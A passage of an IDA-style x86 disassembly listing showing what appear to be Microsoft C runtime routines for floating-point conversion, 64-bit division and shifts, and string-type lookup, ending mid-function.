loc_41D1A7:                             ; CODE XREF: sub_41D0ED+30↑j
                pop     edi
                pop     esi
                pop     ebx
                pop     ebp
                retn
sub_41D0ED      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41D1AC      proc near               ; CODE XREF: sub_41D269+26↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                mov     edx, [ebp+arg_4]
                movzx   eax, word ptr [edx+6]
                push    ebx
                mov     ecx, eax
                push    esi
                push    edi
                shr     ecx, 4
                and     eax, 8000h
                mov     edi, 7FFh
                and     ecx, edi
                mov     [ebp+arg_4], eax
                mov     eax, [edx+4]
                mov     edx, [edx]
                movzx   ebx, cx
                mov     esi, 80000000h
                and     eax, 0FFFFFh
                mov     [ebp+var_4], esi
                test    ebx, ebx
                jz      short loc_41D1FC
                cmp     ebx, edi
                jz      short loc_41D1F5
                add     ecx, 3C00h
                jmp     short loc_41D21D
; ---------------------------------------------------------------------------

loc_41D1F5:                             ; CODE XREF: sub_41D1AC+3F↑j
                mov     edi, 7FFFh
                jmp     short loc_41D220
; ---------------------------------------------------------------------------

loc_41D1FC:                             ; CODE XREF: sub_41D1AC+3B↑j
                xor     ebx, ebx
                cmp     eax, ebx
                jnz     short loc_41D214
                cmp     edx, ebx
                jnz     short loc_41D214
                mov     eax, [ebp+arg_0]
                mov     cx, word ptr [ebp+arg_4]
                mov     [eax+4], ebx
                mov     [eax], ebx
                jmp     short loc_41D260
; ---------------------------------------------------------------------------

loc_41D214:                             ; CODE XREF: sub_41D1AC+54↑j
                                        ; sub_41D1AC+58↑j
                add     ecx, 3C01h
                mov     [ebp+var_4], ebx

loc_41D21D:                             ; CODE XREF: sub_41D1AC+47↑j
                movzx   edi, cx

loc_41D220:                             ; CODE XREF: sub_41D1AC+4E↑j
                mov     ecx, edx
                shr     ecx, 15h
                shl     eax, 0Bh
                or      ecx, eax
                or      ecx, [ebp+var_4]
                mov     eax, [ebp+arg_0]
                shl     edx, 0Bh
                mov     [eax+4], ecx
                mov     [eax], edx
                test    esi, ecx
                jnz     short loc_41D25B

loc_41D23C:                             ; CODE XREF: sub_41D1AC+AD↓j
                mov     ecx, [eax]
                mov     edx, [eax+4]
                mov     ebx, ecx
                add     edx, edx
                shr     ebx, 1Fh
                or      edx, ebx
                add     ecx, ecx
                add     edi, 0FFFFh
                mov     [eax+4], edx
                mov     [eax], ecx
                test    esi, edx
                jz      short loc_41D23C

loc_41D25B:                             ; CODE XREF: sub_41D1AC+8E↑j
                mov     ecx, [ebp+arg_4]
                or      ecx, edi

loc_41D260:                             ; CODE XREF: sub_41D1AC+66↑j
                pop     edi
                pop     esi
                mov     [eax+8], cx
                pop     ebx
                leave
                retn
sub_41D1AC      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41D269      proc near               ; CODE XREF: sub_41BC45+2C↑p
                                        ; sub_41C19F+2C↑p ...

var_30          = dword ptr -30h
var_2C          = word ptr -2Ch
var_2A          = byte ptr -2Ah
var_28          = byte ptr -28h
var_10          = byte ptr -10h
var_4           = dword ptr -4
arg_0           = byte ptr  8
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 30h
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     eax, [ebp+arg_C]
                push    ebx
                mov     ebx, [ebp+arg_8]
                push    esi
                mov     [ebp+var_30], eax
                push    edi
                lea     eax, [ebp+arg_0]
                push    eax
                lea     eax, [ebp+var_10]
                push    eax
                call    sub_41D1AC
                pop     ecx
                pop     ecx
                lea     eax, [ebp+var_2C]
                push    eax
                push    0
                push    11h
                sub     esp, 0Ch
                lea     esi, [ebp+var_10]
                mov     edi, esp
                movsd
                movsd
                movsw
                call    sub_41D4A9
                mov     esi, [ebp+var_30]
                mov     [ebx+8], eax
                movsx   eax, [ebp+var_2A]
                mov     [ebx], eax
                movsx   eax, [ebp+var_2C]
                mov     [ebx+4], eax
                lea     eax, [ebp+var_28]
                push    eax
                push    [ebp+arg_10]
                push    esi
                call    sub_4128F1
                add     esp, 24h
                test    eax, eax
                jz      short loc_41D2E5
                xor     eax, eax
                push    eax
                push    eax
                push    eax
                push    eax
                push    eax
                call    sub_40EB2C
                add     esp, 14h

loc_41D2E5:                             ; CODE XREF: sub_41D269+6B↑j
                mov     ecx, [ebp+var_4]
                pop     edi
                mov     [ebx+0Ch], esi
                pop     esi
                mov     eax, ebx
                xor     ecx, ebp
                pop     ebx
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_41D269      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41D300      proc near               ; CODE XREF: sub_41BD35+2F9↑p
                                        ; sub_41BD35+31F↑p ...

arg_0           = dword ptr  4
arg_4           = dword ptr  8
arg_8           = dword ptr  0Ch
arg_C           = dword ptr  10h

                push    edi
                push    esi
                push    ebp
                xor     edi, edi
                xor     ebp, ebp
                mov     eax, [esp+0Ch+arg_4]
                or      eax, eax
                jge     short loc_41D324
                inc     edi
                inc     ebp
                mov     edx, [esp+0Ch+arg_0]
                neg     eax
                neg     edx
                sbb     eax, 0
                mov     [esp+0Ch+arg_4], eax
                mov     [esp+0Ch+arg_0], edx

loc_41D324:                             ; CODE XREF: sub_41D300+D↑j
                mov     eax, [esp+0Ch+arg_C]
                or      eax, eax
                jge     short loc_41D340
                inc     edi
                mov     edx, [esp+0Ch+arg_8]
                neg     eax
                neg     edx
                sbb     eax, 0
                mov     [esp+0Ch+arg_C], eax
                mov     [esp+0Ch+arg_8], edx

loc_41D340:                             ; CODE XREF: sub_41D300+2A↑j
                or      eax, eax
                jnz     short loc_41D36C
                mov     ecx, [esp+0Ch+arg_8]
                mov     eax, [esp+0Ch+arg_4]
                xor     edx, edx
                div     ecx
                mov     ebx, eax
                mov     eax, [esp+0Ch+arg_0]
                div     ecx
                mov     esi, eax
                mov     eax, ebx
                mul     [esp+0Ch+arg_8]
                mov     ecx, eax
                mov     eax, esi
                mul     [esp+0Ch+arg_8]
                add     edx, ecx
                jmp     short loc_41D3B3
; ---------------------------------------------------------------------------

loc_41D36C:                             ; CODE XREF: sub_41D300+42↑j
                mov     ebx, eax
                mov     ecx, [esp+0Ch+arg_8]
                mov     edx, [esp+0Ch+arg_4]
                mov     eax, [esp+0Ch+arg_0]

loc_41D37A:                             ; CODE XREF: sub_41D300+84↓j
                shr     ebx, 1
                rcr     ecx, 1
                shr     edx, 1
                rcr     eax, 1
                or      ebx, ebx
                jnz     short loc_41D37A
                div     ecx
                mov     esi, eax
                mul     [esp+0Ch+arg_C]
                mov     ecx, eax
                mov     eax, [esp+0Ch+arg_8]
                mul     esi
                add     edx, ecx
                jb      short loc_41D3A8
                cmp     edx, [esp+0Ch+arg_4]
                ja      short loc_41D3A8
                jb      short loc_41D3B1
                cmp     eax, [esp+0Ch+arg_0]
                jbe     short loc_41D3B1

loc_41D3A8:                             ; CODE XREF: sub_41D300+98↑j
                                        ; sub_41D300+9E↑j
                dec     esi
                sub     eax, [esp+0Ch+arg_8]
                sbb     edx, [esp+0Ch+arg_C]

loc_41D3B1:                             ; CODE XREF: sub_41D300+A0↑j
                                        ; sub_41D300+A6↑j
                xor     ebx, ebx

loc_41D3B3:                             ; CODE XREF: sub_41D300+6A↑j
                sub     eax, [esp+0Ch+arg_0]
                sbb     edx, [esp+0Ch+arg_4]
                dec     ebp
                jns     short loc_41D3C5
                neg     edx
                neg     eax
                sbb     edx, 0

loc_41D3C5:                             ; CODE XREF: sub_41D300+BC↑j
                mov     ecx, edx
                mov     edx, ebx
                mov     ebx, ecx
                mov     ecx, eax
                mov     eax, esi
                dec     edi
                jnz     short loc_41D3D9
                neg     edx
                neg     eax
                sbb     edx, 0

loc_41D3D9:                             ; CODE XREF: sub_41D300+D0↑j
                pop     ebp
                pop     esi
                pop     edi
                retn    10h
sub_41D300      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41D3E0      proc near               ; CODE XREF: sub_41BD35+1EC↑p
                                        ; sub_41BD35+240↑p ...
                cmp     cl, 40h
                jnb     short loc_41D3FA
                cmp     cl, 20h
                jnb     short loc_41D3F0
                shrd    eax, edx, cl
                shr     edx, cl
                retn
; ---------------------------------------------------------------------------

loc_41D3F0:                             ; CODE XREF: sub_41D3E0+8↑j
                mov     eax, edx
                xor     edx, edx
                and     cl, 1Fh
                shr     eax, cl
                retn
; ---------------------------------------------------------------------------

loc_41D3FA:                             ; CODE XREF: sub_41D3E0+3↑j
                xor     eax, eax
                xor     edx, edx
                retn
sub_41D3E0      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41D3FF      proc near               ; CODE XREF: sub_41C3FF+10↑p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_8]
                mov     ecx, [ebp+arg_4]
                and     eax, 0FFF7FFFFh
                and     ecx, eax
                push    esi
                test    ecx, 0FCF0FCE0h
                jz      short loc_41D44B
                push    edi
                mov     edi, [ebp+arg_0]
                xor     esi, esi
                cmp     edi, esi
                jz      short loc_41D42F
                push    esi
                push    esi
                call    sub_41DEFB
                pop     ecx
                pop     ecx
                mov     [edi], eax

loc_41D42F:                             ; CODE XREF: sub_41D3FF+23↑j
                call    sub_41090E
                push    16h
                pop     edi
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                mov     [eax], edi
                call    sub_40EC54
                add     esp, 14h
                mov     eax, edi
                pop     edi
                jmp     short loc_41D468
; ---------------------------------------------------------------------------

loc_41D44B:                             ; CODE XREF: sub_41D3FF+19↑j
                mov     esi, [ebp+arg_0]
                push    eax
                push    [ebp+arg_4]
                test    esi, esi
                jz      short loc_41D45F
                call    sub_41DEFB
                mov     [esi], eax
                jmp     short loc_41D464
; ---------------------------------------------------------------------------

loc_41D45F:                             ; CODE XREF: sub_41D3FF+55↑j
                call    sub_41DEFB

loc_41D464:                             ; CODE XREF: sub_41D3FF+5E↑j
                pop     ecx
                pop     ecx
                xor     eax, eax

loc_41D468:                             ; CODE XREF: sub_41D3FF+4A↑j
                pop     esi
                pop     ebp
                retn
sub_41D3FF      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_41D46B(int, DWORD dwInfoType, LPCWSTR lpSrcStr, int cchSrc, LPWORD lpCharType)
sub_41D46B      proc near               ; CODE XREF: sub_41C9B0+62↑p

var_10          = byte ptr -10h
var_8           = dword ptr -8
var_4           = byte ptr -4
arg_0           = dword ptr  8
dwInfoType      = dword ptr  0Ch
lpSrcStr        = dword ptr  10h
cchSrc          = dword ptr  14h
lpCharType      = dword ptr  18h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    [ebp+arg_0]
                lea     ecx, [ebp+var_10]
                call    sub_40E461
                cmp     [ebp+cchSrc], 0FFFFFFFFh
                jge     short loc_41D488
                xor     eax, eax
                jmp     short loc_41D49A
; ---------------------------------------------------------------------------

loc_41D488:                             ; CODE XREF: sub_41D46B+17↑j
                push    [ebp+lpCharType] ; lpCharType
                push    [ebp+cchSrc]    ; cchSrc
                push    [ebp+lpSrcStr]  ; lpSrcStr
                push    [ebp+dwInfoType] ; dwInfoType
                call    ds:GetStringTypeW

loc_41D49A:                             ; CODE XREF: sub_41D46B+1B↑j
                cmp     [ebp+var_4], 0
                jz      short locret_41D4A7
                mov     ecx, [ebp+var_8]
                and     dword ptr [ecx+70h], 0FFFFFFFDh

locret_41D4A7:                          ; CODE XREF: sub_41D46B+33↑j
                leave
                retn
sub_41D46B      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41D4A9      proc near               ; CODE XREF: sub_41D269+41↑p

var_74          = dword ptr -74h
var_70          = dword ptr -70h
var_6C          = dword ptr -6Ch
var_68          = dword ptr -68h
var_64          = dword ptr -64h
var_60          = dword ptr -60h
var_5C          = dword ptr -5Ch
var_58          = dword ptr -58h
var_54          = dword ptr -54h
var_50          = dword ptr -50h
var_4C          = dword ptr -4Ch
var_48          = dword ptr -48h
var_44          = dword ptr -44h
var_40          = dword ptr -40h
var_3C          = dword ptr -3Ch
var_38          = dword ptr -38h
var_34          = dword ptr -34h
var_30          = dword ptr -30h
var_2C          = dword ptr -2Ch
var_28          = dword ptr -28h
var_20          = dword ptr -20h
var_1A          = dword ptr -1Ah
var_16          = dword ptr -16h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = byte ptr  8
arg_C           = dword ptr  14h
arg_10          = byte ptr  18h
arg_14          = dword ptr  1Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 74h
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                push    ebx
                mov     ebx, [ebp+arg_14]
                push    esi
                push    edi
                lea     esi, [ebp+arg_0]
                lea     edi, [ebp+var_10]
                movsd
                movsd
                movsw
                mov     edx, [ebp+var_8]
                mov     ecx, edx
                mov     eax, 8000h
                and     ecx, eax
                and     edx, 7FFFh
                mov     [ebp+var_60], ebx
                mov     byte ptr [ebp+var_30], 0CCh
                mov     byte ptr [ebp+var_30+1], 0CCh
                mov     byte ptr [ebp+var_30+2], 0CCh
                mov     byte ptr [ebp+var_30+3], 0CCh
                mov     byte ptr [ebp+var_2C], 0CCh
                mov     byte ptr [ebp+var_2C+1], 0CCh
                mov     byte ptr [ebp+var_2C+2], 0CCh
                mov     byte ptr [ebp+var_2C+3], 0CCh
                mov     byte ptr [ebp+var_28], 0CCh
                mov     byte ptr [ebp+var_28+1], 0CCh
                mov     byte ptr [ebp+var_28+2], 0FBh
                mov     byte ptr [ebp+var_28+3], 3Fh
                mov     [ebp+var_74], 1
                mov     [ebp+var_70], ecx
                test    cx, cx
                jz      short loc_41D525
                mov     byte ptr [ebx+2], 2Dh
                jmp     short loc_41D529
; ---------------------------------------------------------------------------

loc_41D525:                             ; CODE XREF: sub_41D4A9+74↑j
                mov     byte ptr [ebx+2], 20h

loc_41D529:                             ; CODE XREF: sub_41D4A9+7A↑j
                mov     esi, [ebp+var_C]
                mov     edi, [ebp+var_10]
                test    dx, dx
                jnz     short loc_41D563
                test    esi, esi
                jnz     short loc_41D563
                test    edi, edi
                jnz     short loc_41D563
                xor     edx, edx
                cmp     cx, ax
                setnz   al
                dec     al
                and     al, 0Dh
                add     al, 20h
                mov     [ebx], dx
                mov     [ebx+2], al
                mov     byte ptr [ebx+3], 1
                mov     byte ptr [ebx+4], 30h
                mov     [ebx+5], dl

loc_41D55B:                             ; CODE XREF: sub_41D4A9+74F↓j
                                        ; sub_41D4A9+91F↓j
                xor     eax, eax
                inc     eax
                jmp     loc_41DD81
; ---------------------------------------------------------------------------

loc_41D563:                             ; CODE XREF: sub_41D4A9+89↑j
                                        ; sub_41D4A9+8D↑j ...
                mov     eax, 7FFFh
                cmp     dx, ax
                jnz     loc_41D610
                xor     eax, eax
                inc     eax
                mov     [ebx], ax
                mov     eax, 80000000h
                cmp     esi, eax
                jnz     short loc_41D584
                test    edi, edi
                jz      short loc_41D593

loc_41D584:                             ; CODE XREF: sub_41D4A9+D5↑j
                test    esi, 40000000h
                jnz     short loc_41D593
                push    offset a1Snan   ; "1#SNAN"
                jmp     short loc_41D5E4
; ---------------------------------------------------------------------------

loc_41D593:                             ; CODE XREF: sub_41D4A9+D9↑j
                                        ; sub_41D4A9+E1↑j
                test    cx, cx
                jz      short loc_41D5AB
                cmp     esi, 0C0000000h
                jnz     short loc_41D5AB
                test    edi, edi
                jnz     short loc_41D5DF
                push    offset a1Ind    ; "1#IND"
                jmp     short loc_41D5B8
; ---------------------------------------------------------------------------

loc_41D5AB:                             ; CODE XREF: sub_41D4A9+ED↑j
                                        ; sub_41D4A9+F5↑j
                cmp     esi, eax
                jnz     short loc_41D5DF
                test    edi, edi
                jnz     short loc_41D5DF
                push    offset a1Inf    ; "1#INF"

loc_41D5B8:                             ; CODE XREF: sub_41D4A9+100↑j
                lea     eax, [ebx+4]
                push    16h
                push    eax
                call    sub_4128F1
                add     esp, 0Ch
                xor     esi, esi
                test    eax, eax
                jz      short loc_41D5D9
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                call    sub_40EB2C
                add     esp, 14h

loc_41D5D9:                             ; CODE XREF: sub_41D4A9+121↑j
                mov     byte ptr [ebx+3], 5
                jmp     short loc_41D609
; ---------------------------------------------------------------------------

loc_41D5DF:                             ; CODE XREF: sub_41D4A9+F9↑j
                                        ; sub_41D4A9+104↑j ...
                push    offset a1Qnan   ; "1#QNAN"

loc_41D5E4:                             ; CODE XREF: sub_41D4A9+E8↑j
                lea     eax, [ebx+4]
                push    16h
                push    eax
                call    sub_4128F1
                add     esp, 0Ch
                xor     esi, esi
                test    eax, eax
                jz      short loc_41D605
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                call    sub_40EB2C
                add     esp, 14h

loc_41D605:                             ; CODE XREF: sub_41D4A9+14D↑j
                mov     byte ptr [ebx+3], 6

loc_41D609:                             ; CODE XREF: sub_41D4A9+134↑j
                xor     eax, eax
                jmp     loc_41DD81
; ---------------------------------------------------------------------------

loc_41D610:                             ; CODE XREF: sub_41D4A9+C2↑j
                movzx   ecx, dx
                mov     ebx, ecx
                imul    ecx, 4D10h
                shr     ebx, 8
                mov     eax, esi
                shr     eax, 18h
                lea     eax, [ebx+eax*2]
                imul    eax, 4Dh
                lea     eax, [eax+ecx-134312F4h]
                sar     eax, 10h
                movzx   eax, ax
                xor     ecx, ecx
                movsx   ebx, ax
                mov     word ptr [ebp+var_20], cx
                mov     ecx, offset unk_425F70
                neg     ebx
                sub     ecx, 60h
                mov     [ebp+var_4C], eax
                mov     word ptr [ebp+var_16], dx
                mov     [ebp+var_1A], esi
                mov     [ebp+var_20+2], edi
                mov     [ebp+var_64], ecx
                test    ebx, ebx
                jz      loc_41D8FD
                jge     short loc_41D670
                mov     eax, offset unk_4260D0
                neg     ebx
                sub     eax, 60h
                mov     [ebp+var_64], eax

loc_41D670:                             ; CODE XREF: sub_41D4A9+1B8↑j
                test    ebx, ebx
                jz      loc_41D8FD

loc_41D678:                             ; CODE XREF: sub_41D4A9+44E↓j
                add     [ebp+var_64], 54h
                mov     ecx, ebx
                and     ecx, 7
                sar     ebx, 3
                test    ecx, ecx
                jz      loc_41D8F3
                imul    ecx, 0Ch
                add     ecx, [ebp+var_64]
                mov     eax, ecx
                mov     [ebp+var_44], ecx
                mov     ecx, 8000h
                cmp     [eax], cx
                jb      short loc_41D6B2
                mov     esi, eax
                lea     edi, [ebp+var_3C]
                movsd
                movsd
                lea     eax, [ebp+var_3C]
                movsd
                dec     [ebp+var_3C+2]
                mov     [ebp+var_44], eax

loc_41D6B2:                             ; CODE XREF: sub_41D4A9+1F6↑j
                movzx   edx, word ptr [eax+0Ah]
                xor     ecx, ecx
                mov     [ebp+var_54], ecx
                mov     [ebp+var_10], ecx
                mov     [ebp+var_C], ecx
                mov     [ebp+var_8], ecx
                mov     ecx, [ebp+var_16]
                mov     esi, edx
                xor     esi, ecx
                and     esi, 8000h
                mov     [ebp+var_48], esi
                mov     esi, 7FFFh
                and     ecx, esi
                and     edx, esi
                lea     esi, [edx+ecx]
                movzx   edi, si
                mov     esi, 7FFFh
                cmp     cx, si
                jnb     loc_41D99D
                cmp     dx, si
                jnb     loc_41D99D
                mov     esi, 0BFFDh
                cmp     di, si
                ja      loc_41D99D
                mov     esi, 3FBFh
                cmp     di, si
                ja      short loc_41D722
                xor     esi, esi

loc_41D714:                             ; CODE XREF: sub_41D4A9+2B5↓j
                mov     [ebp+var_1A+2], esi

loc_41D717:                             ; CODE XREF: sub_41D4A9+50D↓j
                mov     [ebp-1Ch], esi
                mov     [ebp+var_20], esi
                jmp     loc_41D8F5
; ---------------------------------------------------------------------------

loc_41D722:                             ; CODE XREF: sub_41D4A9+267↑j
                xor     esi, esi
                cmp     cx, si
                jnz     short loc_41D748
                inc     edi
                test    [ebp+var_1A+2], 7FFFFFFFh
                jnz     short loc_41D748
                cmp     [ebp-1Ch], esi
                jnz     short loc_41D748
                cmp     [ebp+var_20], esi
                jnz     short loc_41D748
                xor     eax, eax
                mov     word ptr [ebp+var_16], ax
                jmp     loc_41D8F5
; ---------------------------------------------------------------------------

loc_41D748:                             ; CODE XREF: sub_41D4A9+27E↑j
                                        ; sub_41D4A9+288↑j ...
                cmp     dx, si
                jnz     short loc_41D760
                inc     edi
                test    dword ptr [eax+8], 7FFFFFFFh
                jnz     short loc_41D760
                cmp     [eax+4], esi
                jnz     short loc_41D760
                cmp     [eax], esi
                jz      short loc_41D714

loc_41D760:                             ; CODE XREF: sub_41D4A9+2A2↑j
                                        ; sub_41D4A9+2AC↑j ...
                and     [ebp+var_58], esi
                lea     esi, [ebp+var_C]
                mov     [ebp+var_40], 5

loc_41D76D:                             ; CODE XREF: sub_41D4A9+334↓j
                mov     ecx, [ebp+var_58]
                mov     edx, [ebp+var_40]
                add     ecx, ecx
                mov     [ebp+var_50], edx
                test    edx, edx
                jle     short loc_41D7D1
                lea     ecx, [ebp+ecx+var_20]
                add     eax, 8
                mov     [ebp+var_6C], ecx
                mov     [ebp+var_68], eax

loc_41D789:                             ; CODE XREF: sub_41D4A9+323↓j
                mov     eax, [ebp+var_6C]
                movzx   ecx, word ptr [eax]
                mov     eax, [ebp+var_68]
                movzx   eax, word ptr [eax]
                mov     edx, [esi-4]
                imul    ecx, eax
                and     [ebp+var_5C], 0
                lea     eax, [edx+ecx]
                cmp     eax, edx
                jb      short loc_41D7AA
                cmp     eax, ecx
                jnb     short loc_41D7B1

loc_41D7AA:                             ; CODE XREF: sub_41D4A9+2FB↑j
                mov     [ebp+var_5C], 1

loc_41D7B1:                             ; CODE XREF: sub_41D4A9+2FF↑j
                cmp     [ebp+var_5C], 0
                mov     [esi-4], eax
                jz      short loc_41D7BD
                inc     word ptr [esi]

loc_41D7BD:                             ; CODE XREF: sub_41D4A9+30F↑j
                add     [ebp+var_6C], 2
                sub     [ebp+var_68], 2
                dec     [ebp+var_50]
                cmp     [ebp+var_50], 0
                jg      short loc_41D789
                mov     eax, [ebp+var_44]

loc_41D7D1:                             ; CODE XREF: sub_41D4A9+2D1↑j
                inc     esi
                inc     esi
                inc     [ebp+var_58]
                dec     [ebp+var_40]
                cmp     [ebp+var_40], 0
                jg      short loc_41D76D
                add     edi, 0C002h
                test    di, di
                jle     short loc_41D825

loc_41D7EA:                             ; CODE XREF: sub_41D4A9+375↓j
                test    [ebp+var_8], 80000000h
                jnz     short loc_41D820
                mov     eax, [ebp+var_C]
                mov     ecx, [ebp+var_10]
                shl     [ebp+var_10], 1
                mov     edx, eax
                add     eax, eax
                shr     ecx, 1Fh
                or      eax, ecx
                mov     [ebp+var_C], eax
                mov     eax, [ebp+var_8]
                shr     edx, 1Fh
                add     eax, eax
                or      eax, edx
                add     edi, 0FFFFh
                mov     [ebp+var_8], eax
                test    di, di
                jg      short loc_41D7EA

loc_41D820:                             ; CODE XREF: sub_41D4A9+348↑j
                test    di, di
                jg      short loc_41D872

loc_41D825:                             ; CODE XREF: sub_41D4A9+33F↑j
                add     edi, 0FFFFh
                test    di, di
                jge     short loc_41D872
                mov     eax, edi
                neg     eax
                movzx   eax, ax
                add     edi, eax

loc_41D839:                             ; CODE XREF: sub_41D4A9+3BD↓j
                test    byte ptr [ebp+var_10], 1
                jz      short loc_41D842
                inc     [ebp+var_54]

loc_41D842:                             ; CODE XREF: sub_41D4A9+394↑j
                mov     ecx, [ebp+var_8]
                mov     esi, [ebp+var_C]
                mov     edx, [ebp+var_C]
                shr     [ebp+var_8], 1
                shl     ecx, 1Fh
                shr     esi, 1
                or      esi, ecx
                mov     ecx, [ebp+var_10]
                shl     edx, 1Fh
                shr     ecx, 1
                or      ecx, edx
                dec     eax
                mov     [ebp+var_C], esi
                mov     [ebp+var_10], ecx
                jnz     short loc_41D839
                cmp     [ebp+var_54], eax
                jz      short loc_41D872
                or      word ptr [ebp+var_10], 1

loc_41D872:                             ; CODE XREF: sub_41D4A9+37A↑j
                                        ; sub_41D4A9+385↑j ...
                mov     eax, 8000h
                mov     ecx, eax
                cmp     word ptr [ebp+var_10], cx
                ja      short loc_41D890
                mov     ecx, [ebp+var_10]
                and     ecx, 1FFFFh
                cmp     ecx, 18000h
                jnz     short loc_41D8C4

loc_41D890:                             ; CODE XREF: sub_41D4A9+3D4↑j
                cmp     [ebp+var_10+2], 0FFFFFFFFh
                jnz     short loc_41D8C1
                and     [ebp+var_10+2], 0
                cmp     [ebp+var_C+2], 0FFFFFFFFh
                jnz     short loc_41D8BC
                and     [ebp+var_C+2], 0
                mov     ecx, 0FFFFh
                cmp     word ptr [ebp+var_8+2], cx
                jnz     short loc_41D8B6
                mov     word ptr [ebp+var_8+2], ax
                inc     edi
                jmp     short loc_41D8C4
; ---------------------------------------------------------------------------

loc_41D8B6:                             ; CODE XREF: sub_41D4A9+404↑j
                inc     word ptr [ebp+var_8+2]
                jmp     short loc_41D8C4
; ---------------------------------------------------------------------------

loc_41D8BC:                             ; CODE XREF: sub_41D4A9+3F5↑j
                inc     [ebp+var_C+2]
                jmp     short loc_41D8C4
; ---------------------------------------------------------------------------

loc_41D8C1:                             ; CODE XREF: sub_41D4A9+3EB↑j
                inc     [ebp+var_10+2]

loc_41D8C4:                             ; CODE XREF: sub_41D4A9+3E5↑j
                                        ; sub_41D4A9+40B↑j ...
                mov     eax, 7FFFh
                cmp     di, ax
                jb      loc_41D97D
                xor     eax, eax
                xor     ecx, ecx
                cmp     word ptr [ebp+var_48], ax
                mov     [ebp-1Ch], eax
                setz    cl
                mov     [ebp+var_20], eax
                dec     ecx
                and     ecx, 80000000h
                add     ecx, 7FFF8000h
                mov     [ebp+var_1A+2], ecx

loc_41D8F3:                             ; CODE XREF: sub_41D4A9+1DD↑j
                                        ; sub_41D4A9+4EF↓j
                xor     esi, esi

loc_41D8F5:                             ; CODE XREF: sub_41D4A9+274↑j
                                        ; sub_41D4A9+29A↑j
                cmp     ebx, esi
                jnz     loc_41D678

loc_41D8FD:                             ; CODE XREF: sub_41D4A9+1B2↑j
                                        ; sub_41D4A9+1C9↑j
                mov     ecx, [ebp+var_1A+2]
                shr     ecx, 10h
                mov     edx, 3FFFh
                mov     eax, 7FFFh
                cmp     cx, dx
                jb      loc_41DBB9
                inc     [ebp+var_4C]
                xor     edx, edx
                mov     [ebp+var_50], edx
                mov     [ebp+var_10], edx
                mov     [ebp+var_C], edx
                mov     [ebp+var_8], edx
                mov     edx, [ebp+var_28+2]
                movzx   ecx, cx
                mov     ebx, edx
                xor     ebx, ecx
                and     ecx, eax
                and     edx, eax
                and     ebx, 8000h
                mov     edi, eax
                lea     esi, [edx+ecx]
                mov     [ebp+var_5C], ebx
                movzx   esi, si
                cmp     cx, di
                jnb     loc_41DB9B
                cmp     dx, ax
                jnb     loc_41DB9B
                mov     eax, 0BFFDh
                cmp     si, ax
                ja      loc_41DB9B
                mov     eax, 3FBFh
                cmp     si, ax
                ja      short loc_41D9BB
                xor     eax, eax

loc_41D972:                             ; CODE XREF: sub_41D4A9+54D↓j
                mov     [ebp-1Ch], eax
                mov     [ebp+var_20], eax
                jmp     loc_41DBB6
; ---------------------------------------------------------------------------

loc_41D97D:                             ; CODE XREF: sub_41D4A9+423↑j
                mov     ax, word ptr [ebp+var_10+2]
                or      edi, [ebp+var_48]
                mov     word ptr [ebp+var_20], ax
                mov     eax, [ebp+var_C]
                mov     [ebp+var_20+2], eax
                mov     eax, [ebp+var_8]
                mov     [ebp+var_1A], eax
                mov     word ptr [ebp+var_16], di
                jmp     loc_41D8F3
; ---------------------------------------------------------------------------

loc_41D99D:                             ; CODE XREF: sub_41D4A9+242↑j
                                        ; sub_41D4A9+24B↑j ...
                xor     eax, eax
                xor     esi, esi
                cmp     word ptr [ebp+var_48], si
                setz    al
                dec     eax
                and     eax, 80000000h
                add     eax, 7FFF8000h
                mov     [ebp+var_1A+2], eax
                jmp     loc_41D717
; ---------------------------------------------------------------------------

loc_41D9BB:                             ; CODE XREF: sub_41D4A9+4C5↑j
                xor     eax, eax
                cmp     cx, ax
                jnz     short loc_41D9DF
                inc     esi
                test    [ebp+var_1A+2], 7FFFFFFFh
                jnz     short loc_41D9DF
                cmp     [ebp-1Ch], eax
                jnz     short loc_41D9DF
                cmp     [ebp+var_20], eax
                jnz     short loc_41D9DF
                mov     word ptr [ebp+var_16], ax
                jmp     loc_41DBB9
; ---------------------------------------------------------------------------

loc_41D9DF:                             ; CODE XREF: sub_41D4A9+517↑j
                                        ; sub_41D4A9+521↑j ...
                cmp     dx, ax
                jnz     short loc_41D9FC
                inc     esi
                test    [ebp+var_28], 7FFFFFFFh
                jnz     short loc_41D9FC
                cmp     [ebp+var_2C], eax
                jnz     short loc_41D9FC
                cmp     [ebp+var_30], eax
                jz      loc_41D972

loc_41D9FC:                             ; CODE XREF: sub_41D4A9+539↑j
                                        ; sub_41D4A9+543↑j ...
                mov     [ebp+var_58], eax
                lea     edi, [ebp+var_C]
                mov     [ebp+var_40], 5

loc_41DA09:                             ; CODE XREF: sub_41D4A9+5C5↓j
                mov     eax, [ebp+var_58]
                mov     ecx, [ebp+var_40]
                add     eax, eax
                mov     [ebp+var_54], ecx
                test    ecx, ecx
                jle     short loc_41DA62
                lea     ecx, [ebp+var_28]
                mov     [ebp+var_48], ecx
